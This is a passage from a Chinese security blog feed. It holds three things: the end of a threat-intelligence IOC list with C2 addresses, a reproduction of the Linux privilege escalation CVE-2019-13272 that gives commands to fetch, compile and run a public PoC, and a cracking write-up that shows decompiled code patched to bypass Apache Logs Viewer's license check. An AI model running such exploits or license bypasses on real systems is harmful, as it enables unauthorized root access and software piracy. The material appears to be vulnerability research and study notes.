.36.99.194<br>54.37.121.239<br>54.37.137.33<br>54.37.36.124<br>54.38.49.228<br>54.39.148.97<br>54.39.196.33<br>54.39.21.207<br>54.39.47.26<br>54.85.193.151<br>54.85.84.53<br>54.91.77.206<br>54.93.198.63<br>58.211.82.93<br>58.96.89.121<br>58.97.8.10<br>59.125.214.115<br>60.249.179.122<br>60.43.243.189<br>61.41.4.26<br>61.47.40.39<br>62.113.230.83<br>62.116.165.86<br>62.122.137.150<br>62.20.84.56<br>62.210.113.223<br>62.210.113.228<br>62.210.129.106<br>62.210.148.238<br>62.210.185.4<br>62.210.214.118<br>62.210.214.7<br>62.210.9.67<br>62.210.99.93<br>62.212.130.211<br>62.219.78.154<br>62.219.78.156<br>62.219.78.159<br>62.220.96.102<br>62.221.197.214<br>62.75.138.113<br>63.175.159.27<br>63.75.167.91<br>64.111.110.41<br>64.111.117.197<br>64.111.126.250<br>64.147.114.15<br>64.156.26.211<br>64.202.185.111<br>64.90.36.105<br>64.91.242.121<br>64.91.242.27<br>66.175.222.169<br>66.206.23.42<br>66.23.233.59<br>66.33.212.11<br>66.42.38.173<br>66.42.63.215<br>66.42.69.87<br>66.45.245.146<br>66.64.43.162<br>66.70.186.233<br>66.70.191.84<br>67.158.54.243<br>67.205.10.15<br>67.205.11.86<br>67.205.138.72<br>67.205.140.232<br>67.205.145.165<br>67.205.157.56<br>67.205.158.239<br>67.205.169.2<br>67.205.181.182<br>67.209.114.118<br>67.211.213.120<br>67.213.72.3<br>67.225.139.208<br>67.227.236.96<br>67.227.237.176<br>67.23.238.162<br>68.183.129.196<br>68.183.134.90<br>68.183.165.78<br>68.183.167.60<br>68.183.176.185<br>68.183.182.160<br>68.183.182.43<br>68.183.183.174<br>68.183.184.231<br>68.183.184.69<br>68.183.184.78<br>68.183.188.177<br>68.183.188.180<br>68.183.196.199<br>68.183.211.45<br>68.183.224.45<br>68.183.230.27<br>68.183.230.5<br>68.183.233.74<br>68.183.33.7<br>68.183.72.245<br>68.183.76.179<br>68.183.80.165<br>68.183.81.132<br>68.183.88.87<br>68.183.94.110<br>69.163.152.131<br>69.163.152.137<br>69.163.224.108<br>69.175.75.86<br>69.64.34.208<br>69.64.83.37<br>70.77.238.17<br>71.163.1.122<br>71.185.55.185<br>71.188.108.35<br>72.128.132.6<br>72.52.169.207<br>74.208.145.37<br>74.208.156.171<br>74.208.211.90<br>74.208.239.45<br>74.208.244.18<br>75.119.200.115<br>75.8.213.252<br>77.221.147.12<br>77.245.149.38<br>77.245.149.64<br>77.246.188.101<br>77.68.20.155<br>77.81.121.157<br>77.88.87.74<br>78.108.216.156<br>78.108.34.9<br>78.142.210.210<br>78.155.206.55<br>78.157.210.66<br>78.46.55.205<br>78.46.89.66<br>78.46.97.217<br>78.46.97.240<br>79.137.38.108<br>79.143.181.197<br>79.143.181.49<br>79.98.108.115<br>8.9.37.28<br>80.191.140.42<br>80.211.104.210<br>80.211.189.126<br>80.211.52.74<br>80.241.141.37<br>80.241.218.2<br>80.244.184.168<br>80.48.183.178<br>81.169.128.157<br>81.169.196.253<br>81.31.41.70<br>81.46.200.250<br>81.90.180.144<br>81.95.125.200<br>82.146.152.108<br>82.146.38.63<br>82.165.161.17<br>82.220.37.159<br>82.220.37.30<br>82.223.111.49<br>82.223.21.191<br>82.223.21.77<br>82.223.39.243<br>82.223.97.43<br>82.68.10.194<br>85.120.166.136<br>85.124.3.6<br>85.195.93.251<br>86.110.226.170<br>86.57.163.105<br>87.106.152.199<br>87.106.20.234<br>88.135.38.198<br>88.191.45.2<br>88.198.196.71<br>88.198.21.136<br>88.198.22.43<br>88.208.28.48<br>88.99.171.92<br>88.99.217.117<br>89.107.70.188<br>89.111.179.80<br>89.111.20.2<br>89.111.35.28<br>89.163.146.194<br>89.184.155.89<br>89.184.77.217<br>89.22.102.60<br>89.252.151.219<br>89.252.178.138<br>89.252.184.54<br>89.35.39.126<br>89.35.7.226<br>89.36.151.134<br>89.44.32.18<br>90.148.193.235<br>91.109.201.228<br>91.121.112.70<br>91.121.115.100<br>91.121.164.129<br>91.121.71.183<br>91.134.248.211<br>91.134.248.230<br>91.134.248.235<br>91.185.198.219<br>91.185.212.110<br>91.192.224.186<br>91.203.73.180<br>91.205.172.43<br>91.208.99.2<br>91.209.70.223<br>91.211.247.201<br>91.213.46.238<br>91.234.194.246<br>91.240.86.82<br>91.241.48.251<br>91.247.228.190<br>91.247.228.3<br>91.82.84.238<br>91.90.192.56<br>92.222.170.145<br>92.222.35.94<br>92.249.219.108<br>92.60.224.56<br>92.60.38.183<br>93.114.234.224<br>93.84.117.222<br>94.101.95.75<br>94.126.168.66<br>94.127.188.209<br>94.130.80.70<br>94.136.160.62<br>94.177.191.63<br>94.182.227.98<br>94.199.51.166<br>94.23.216.91<br>94.23.248.69<br>94.23.38.46<br>94.23.50.54<br>94.237.73.167<br>94.52.41.79<br>95.110.167.67<br>95.110.200.187<br>95.110.207.17<br>95.129.40.125<br>95.153.30.172<br>95.163.121.78<br>95.173.160.84<br>95.211.213.199<br>95.216.106.100<br>95.216.64.168<br>95.85.28.28<br>96.30.193.114<br>96.45.178.13<br>97.74.229.105<br>97.74.232.69<br>97.74.237.173<br>99.80.194.212</p></blockquote><h2 id="IOC【C2】"><a href="#IOC【C2】" class="headerlink" title="IOC【C2】"></a>IOC【C2】</h2><blockquote><p>193.57.40.41<br>45.227.253.226<br>45.227.253.227<br>45.227.253.234</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 威胁情报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-13272 复现&amp;注意事项</title>
      <link href="/p/fe4f.html"/>
      <url>/p/fe4f.html</url>
      
        <content type="html"><![CDATA[<p>记录下<code>CVE-2019-13272</code>复现和注意事项</p><span id="more"></span><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><blockquote><p>OS: Ubuntu 18.04</p><p>Kernel: 4.18.0-15-generic</p></blockquote><p><img src="/images/1564224042649.png" alt="1564224042649"></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>下载<code>CVE-2019-13272</code>POC：<a href="https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c">https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c</a></p><p><code>wget https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</code></p><p><img src="/images/1564224369282.png" alt="1564224369282"></p></li><li><p>编译<code>gcc -s poc.c -o test </code></p><p><img src="/images/1564224394522.png" alt="1564224394522"></p></li><li><p>赋予权限<code>chmod +x test </code></p><p><img src="/images/1564224422005.png" alt="1564224422005"></p></li><li><p>运行<code>./test</code></p><p><img src="/images/1564224440415.png" alt="1564224440415"></p></li></ol><p>复现结束</p><h1 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h1><p>既然能在桌面环境下提权，那在<code>ssh</code>下是否能提权呢？</p><p>继续验证</p><p><img src="/images/1564226297930.png" alt="1564226297930"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">λ ssh test@10.2.2.133</span><br><span class="line">The authenticity of host &#x27;10.2.2.133 (10.2.2.133)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:w8vbQc50yCuyVwaklzi+Xnnc94ZXkNshe+g8eg4o4ps.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &#x27;10.2.2.133&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">test@10.2.2.133&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.18.0-15-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">431 packages can be updated.</span><br><span class="line">173 updates are security updates.</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">test@ubuntu-vm:~$ ./test</span><br><span class="line">Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)</span><br><span class="line">[.] Checking environment ...</span><br><span class="line">[!] Warning: Could not find active PolKit agent</span><br><span class="line">[.] Searching for known helpers ...</span><br><span class="line">[~] Found known helper: /usr/lib/gnome-settings-daemon/gsd-backlight-helper</span><br><span class="line">[.] Using helper: /usr/lib/gnome-settings-daemon/gsd-backlight-helper</span><br><span class="line">[.] Spawning suid process (/usr/bin/pkexec) ...</span><br><span class="line">Error executing command as another user: Not authorized</span><br><span class="line"></span><br><span class="line">This incident has been reported.</span><br><span class="line">[-] Error: read(fd, buf, sizeof(buf)-1)</span><br><span class="line">[~] Found known helper: /usr/lib/gnome-settings-daemon/gsd-wacom-led-helper</span><br><span class="line">[.] Using helper: /usr/lib/gnome-settings-daemon/gsd-wacom-led-helper</span><br><span class="line">[-] Error: pipe2(block_pipe, O_CLOEXEC|O_DIRECT)</span><br><span class="line">[.] Searching for useful helpers ...</span><br><span class="line">[-] Failed to run: /usr/bin/pkaction --verbose</span><br><span class="line">test@ubuntu-vm:~$</span><br></pre></td></tr></table></figure><p>显然无法执行，看下漏洞细节</p><p>截取自NVD</p><p><img src="/images/1564226068861.png" alt="1564226068861"></p><blockquote><h2 id="CVE-2019-13272-Detail"><a href="#CVE-2019-13272-Detail" class="headerlink" title="CVE-2019-13272 Detail"></a>CVE-2019-13272 Detail</h2><p>MODIFIED</p><hr><p>This vulnerability has been modified since it was last analyzed by the NVD. It is awaiting reanalysis which may result in further changes to the information provided.</p><h3 id="Current-Description"><a href="#Current-Description" class="headerlink" title="Current Description"></a>Current Description</h3><p>In the Linux kernel before 5.1.17, ptrace_link in kernel&#x2F;ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit’s <strong>pkexec</strong> helper with PTRACE_TRACEME. </p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kernel 5.1.17之前版本中存在安全漏洞，该漏洞源于kernel/ptrace.c文件的ptrace_link没有正确处理对凭证的记录。攻击者可利用该漏洞获取root访问权限。由于PTRACE_TRACEME允许的borked权限，利用bug在概念上很有趣。对象生命周期处理问题可能会导致内存损坏，但它需要以精确的方式进行代码竞争。事实PTRACE_TRACEME证明，除了父进程之外，内核还记录了跟踪器的凭据。研究人员概述的方案涉及一个父进程，该进程创建一个子进程，这个子进程会创建子进程。第一个子进程使用命令pkexec（用于以root身份运行程序），第二个子进程运行PTRACE_TRACEME，然后第一个子进程丢弃其权限。最终结果是父进程可以使用ptrace来控制第一个子进程，后者可以使用ptrace来控制第二个子进程 - 从而让攻击者获得对两个进程的控制权。</span><br></pre></td></tr></table></figure><h2 id="几个关键点"><a href="#几个关键点" class="headerlink" title="几个关键点"></a><strong>几个关键点</strong></h2><h3 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h3><p><code>Polkit</code> 在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统。和<code>sudo</code>等程序不同，<code>Polkit </code>并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。</p><p><code>Polkit </code>定义出一系列操作，例如运行<code> GParted</code>, 并将用户按照群组或用户名进行划分，例如 <code>wheel </code>群组用户。然后定义每个操作是否可以由某些用户执行，执行操作前是否需要一些额外的确认，例如通过输入密码确认用户是不是属于某个群组。</p><h3 id="pkexec"><a href="#pkexec" class="headerlink" title="pkexec"></a>pkexec</h3><blockquote><p><strong>pkexec</strong> allows an authorized user to execute <em>PROGRAM</em> as another user. If <em>username</em> is not specified, then the program will be executed as the administrative super user, <em>root</em>.</p></blockquote><p><code>pkexec允许授权用户作为另一个用户执行程序。如果没有指定用户名，则程序将作为管理超级用户root执行。</code></p><p>普通用户在SSH中使用pkexec时会显示如下需要密码验证</p><blockquote><p>test@ubuntu-vm:~$ pkexec –user root whoami<br>&#x3D;&#x3D;&#x3D;&#x3D; AUTHENTICATING FOR org.freedesktop.policykit.exec &#x3D;&#x3D;&#x3D;<br>Authentication is needed to run &#96;&#x2F;usr&#x2F;bin&#x2F;whoami’ as the super user<br>Authenticating as: test,,, (test)<br>Password:</p></blockquote><p>在Gnome桌面中</p><p><img src="/images/1564226895216.png" alt="1564226895216"></p><h2 id="在server版本中实测无法提权"><a href="#在server版本中实测无法提权" class="headerlink" title="在server版本中实测无法提权"></a>在server版本中实测无法提权</h2><p><img src="/images/1564231549834.png" alt="1564231549834"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过poc代码中的部分代码，推测为<code>gnome</code>桌面程序存在的缺陷导致用户可以实现代码层面的条件竞争导致了提权，但是实战中多数服务器不会配备桌面环境，属比较鸡肋的提权漏洞</p>]]></content>
      
      
      <categories>
          
          <category> VulRepro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> VulRepro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Logs View破解笔记</title>
      <link href="/p/a3aa.html"/>
      <url>/p/a3aa.html</url>
      
        <content type="html"><![CDATA[<p>记录下<code>Apache Logs Viewer</code>的破解笔记</p><span id="more"></span><p>拿到软件先查壳，发现是<code>.net</code>的，混淆过</p><p><img src="/images/1563951309856.png"></p><p><code>de4dot</code>去混淆后</p><p><img src="/images/1563951350651.png"></p><p>打开看看限制的功能和输入注册码那提示什么</p><p><img src="/images/1563952890139.png"></p><p><img src="/images/1563951471388.png"></p><p>随便输个，看看报错</p><p><img src="/images/1563951483942.png"></p><p>关键词<code>unlock code</code></p><p>去混淆后的软件载入<code>dnspy</code>，全局搜下看看</p><p><img src="/images/1563951541024.png"></p><p>搜到了2个主窗体的，直接看<code>unlockCodeToolStripMenuItem_Click</code>方法</p><p><img src="/images/1563951666156.png"></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token: 0x060001E4 RID: 484 RVA: 0x0001E230 File Offset: 0x0001C430</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unlockCodeToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> text = <span class="keyword">this</span>.prefs_0.Key;</span><br><span class="line"><span class="keyword">if</span> (!InputForm.smethod_3(<span class="string">&quot;Apache Logs Viewer | &quot;</span> + Class96.smethod_264(), Class96.smethod_143(), <span class="keyword">ref</span> text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (text != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">text = text.Trim();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(text))<span class="comment">//判断是否为空</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = <span class="built_in">string</span>.Empty;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.WaitCursor;</span><br><span class="line"><span class="keyword">if</span> (text.Length &lt; <span class="number">22</span>)<span class="comment">//判断输入的字符串长度</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Class2.smethod_1(Class2.smethod_0(text)))<span class="comment">//判断注册码的关键点</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = text;</span><br><span class="line"><span class="keyword">this</span>.method_23();<span class="comment">//联网返回信息</span></span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);<span class="comment">//保存注册码为文件</span></span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_253() + <span class="string">&quot; Apache Logs Viewer.&quot;</span>;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_253() + <span class="string">&quot; Apache Logs Viewer.&quot;</span>, <span class="string">&quot;Apache Logs Viewer&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);<span class="comment">//返回感谢注册</span></span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;<span class="comment">//返回真</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_117(), <span class="string">&quot;Apache Logs Viewer | &quot;</span> + Class96.smethod_264(), MessageBoxButtons.OK, MessageBoxIcon.Hand);<span class="comment">//返回激活码错误</span></span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;<span class="comment">//返回假</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_90(), <span class="string">&quot;Apache Logs Viewer | &quot;</span> + Class96.smethod_264(), MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><p>直接将代码修改为</p><p><img src="/images/1563951967746.png"></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token: 0x060001E4 RID: 484 RVA: 0x0001E230 File Offset: 0x0001C430</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unlockCodeToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> text = <span class="keyword">this</span>.prefs_0.Key;</span><br><span class="line"><span class="keyword">if</span> (!InputForm.smethod_3(<span class="string">&quot;Apache Logs Viewer | &quot;</span> + Class96.smethod_264(), Class96.smethod_143(), <span class="keyword">ref</span> text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = text;</span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_253() + <span class="string">&quot; Apache Logs Viewer.&quot;</span>;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_253() + <span class="string">&quot; Apache Logs Viewer.&quot;</span>, <span class="string">&quot;Apache Logs Viewer&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后保存，这样不输入或输入任意字符都能注册了</p><p><img src="/images/1563951989630.png"></p><p>但是这样有个问题，下次再重开还得再注册遍，推测有个重启校验的暗桩</p><p><img src="/images/1563952039205.png" alt="重启软件后"></p><p>再看看软件启动时的动作，定位到<code>MainForm_Load</code>方法</p><p>其中发现<code>bool_0</code>这个变量是用来对注册进行校验的，细看这个方法后找到了重启校验的地方</p><p><img src="/images/1563952123158.png"></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">MainForm_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_2)</span><br><span class="line">&#123;</span><br><span class="line">Prefs.DeletePrefs();</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Started..&quot;</span>);</span><br><span class="line">Prefs prefs = Prefs.Load(Prefs.Filename);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(prefs.InstallID))</span><br><span class="line">&#123;</span><br><span class="line">prefs.InstallID = Guid.NewGuid().ToString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.sizex &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Width = prefs.sizex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.sizey &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Height = prefs.sizey;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.maximised)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.WindowState = FormWindowState.Maximized;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.x &gt;= <span class="number">0</span> &amp;&amp; prefs.y &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Location = <span class="keyword">new</span> Point(prefs.x, prefs.y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.prefs_0 = prefs;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.logColumns == <span class="literal">null</span> || <span class="keyword">this</span>.prefs_0.logColumns.Count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.logColumns = LogColumn.ResetLogColumns();</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Loading Custom Columns&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.prefsColumns_0 = PrefsColumns.Load(PrefsColumns.Filename);</span><br><span class="line"><span class="keyword">this</span>.method_42();</span><br><span class="line">DummyListView.prefs = prefs;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Loading IP DB&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.ip2Country_0 = <span class="keyword">new</span> IP2Country(<span class="literal">true</span>, <span class="keyword">this</span>.prefs_0.useCity);</span><br><span class="line"><span class="keyword">this</span>.parser_0 = <span class="keyword">new</span> Parser(<span class="keyword">this</span>.ip2Country_0);</span><br><span class="line"><span class="keyword">this</span>.parser_0.ParseCustomColumns = <span class="keyword">this</span>.prefs_0.parseCustomColumns;</span><br><span class="line">Statistics.int_0 = <span class="keyword">this</span>.prefs_0.topNumber;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (prefs.monitorAuto)</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Opening Logs...&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (LoggerInfo loggerInfo <span class="keyword">in</span> prefs.logsToView)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (loggerInfo.Highlight != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_48(loggerInfo.Highlight, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_6(loggerInfo);</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">GC.Collect();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Class95.list_0 != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="built_in">string</span> text <span class="keyword">in</span> Class95.list_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">bool</span> flag = <span class="keyword">this</span>.parser_0.IsErrorLog(text);</span><br><span class="line"><span class="keyword">this</span>.method_4(text, !flag, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">GC.Collect();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(Class96.smethod_247());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.selTab &gt;= <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.tabControl1.TabPages.Count &gt; <span class="keyword">this</span>.prefs_0.selTab)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.tabControl1.SelectedTabPageIndex = <span class="keyword">this</span>.prefs_0.selTab;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(<span class="keyword">this</span>.prefs_0.Key))<span class="comment">//判断本地保存的激活码是否为空</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> string_ = Class2.smethod_0(<span class="keyword">this</span>.prefs_0.Key);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = Class2.smethod_1(string_);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (IsStoreApp.IsWindowsStoreApp)<span class="comment">//判断是否为winstore下载的，如果是就免去验证</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.bool_1 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.method_0();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.bool_0)<span class="comment">//bool_0这个变量很重要</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_270() + <span class="string">&quot; Apache Logs Viewer...&quot;</span> + Class96.smethod_67();</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_270() + <span class="string">&quot; Apache Logs Viewer&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Apply L...&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.method_44(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">this</span>.method_1();</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Apply L Done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex)</span><br><span class="line">&#123;</span><br><span 